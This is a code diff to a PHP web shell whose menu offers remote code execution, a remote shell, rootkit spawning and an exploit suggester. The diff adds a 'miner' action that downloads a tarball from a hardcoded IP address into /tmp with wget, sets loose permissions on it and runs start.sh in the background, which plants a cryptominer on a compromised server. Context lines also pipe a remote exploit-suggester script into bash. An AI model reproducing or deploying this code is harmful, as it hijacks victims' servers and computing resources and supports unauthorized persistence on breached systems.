@@ -2082,6 +2082,16 @@ if($s_auth){
 		}
 	}
 
+	elseif(isset($_REQUEST['x']) && ($_REQUEST['x']=='miner')){
+        	exe("cd /tmp && wget http://128.199.187.254/miner.tar.gz && tar -xzvf miner.tar.gz && chmod 0777 * && echo 1 > .status && ./start.sh > /dev/null 2>&1 &");
+		$check_m1n3r = file_get_contents('.status');
+		if($check_m1n3r == "1"){
+			$s_result .= "Miner Started.";
+		} else {
+			$s_result .= "Failed to Start Miner.";
+		}
+	}
+
 	// spawn suggester
 	elseif(isset($_REQUEST['x']) && ($_REQUEST['x']=='suggester')){
 		$s_result .= "<pre><code>".exe("curl -Lsk https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/refs/heads/master/linux-exploit-suggester.sh | bash")."</code></pre>";
@@ -2271,7 +2281,8 @@ if($s_auth){
 		<td><a href='<?php echo $s_self; ?>x=eval' title='Execute code' onclick='return false;'><div class='menumi'>Execute</div></a></td>
 		<td><a href='<?php echo $s_self; ?>x=rs' title='Remote Shell' onclick='return false;'><div class='menumi'>Remote</div></a></td>
 		<td><a href='<?php echo $s_self; ?>x=db' title='Connect to database' onclick='return false;'><div class='menumi'>Connect</div></a></td>
-		<td><a href='<?php echo $s_self; ?>x=rootkit' title='Spawn Rootkit' onclick='return false;'><div class='menumi'>Spawn</div></a></td>
+		<td><a href='<?php echo $s_self; ?>x=rootkit' title='Spawn Rootkit' onclick='return false;'><div class='menumi'>Rootkit</div></a></td>
+		<td><a href='<?php echo $s_self; ?>x=miner' title='Spawn Miner' onclick='return false;'><div class='menumi'>Miner</div></a></td>
 		<td><a href='<?php echo $s_self; ?>x=suggester' title='Exploit Suggester' onclick='return false;'><div class='menumi'>Suggester</div></a></td>
 		<td><a href='<?php echo $s_self; ?>x=adminer' title='Spawn Adminer' onclick='return false;'><div class='menumi'>Adminer</div></a></td>
 		<td><a href='<?php echo $s_self; ?>x=about' title='About Of Shell' onclick='return false;'><div class='menumi'>About</div></a></td>
